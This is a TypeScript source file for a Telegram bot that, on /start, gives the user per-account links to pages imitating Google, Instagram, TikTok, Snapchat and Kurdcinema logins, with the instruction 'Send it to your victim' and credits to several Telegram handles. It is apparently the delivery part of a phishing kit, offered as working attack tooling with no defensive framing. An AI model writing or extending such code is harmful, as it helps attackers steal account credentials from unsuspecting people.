import { Bot } from "grammy";
import { envs } from "./envs";

export const bot = new Bot(envs.TELEGRAM_TOKEN);
bot.command("start", async (ctx) => {
	if (!ctx.from) {
		await ctx.reply("Unfortunately, I can't proceed at this time.\n\n" + "Please try again.\n\n" + "/start");
		return;
	}

	const link = `${envs.APP_URL}/${ctx.from.id}`;

	await ctx.reply(
		"@xByteBlitzX\n@SeeYouIOSVIP\n\n" +
			"Send it to your victim\n\n" +
			"Google:\n" +
			`${link}/Google\n\n` +
			"Instagram:\n" +
			`${link}/Instagram\n\n` +
			"Tiktok:\n" +
			`${link}/Tiktok\n\n` +
			"Snapchat:\n" +
			`${link}/Snapchat\n\n` +
			"Kurdcinema:\n" +
			`${link}/Kurdcinama\n\n` +
			">>>>\n" +
			"@xByteBlitzX\n@SeeYouIOSVIP\n@xN1ghtmare",
		{
			parse_mode: "HTML",
		},
	);
});
bot.errorBoundary((error) => {
	console.error("An error occurred in the bot:", error);
});
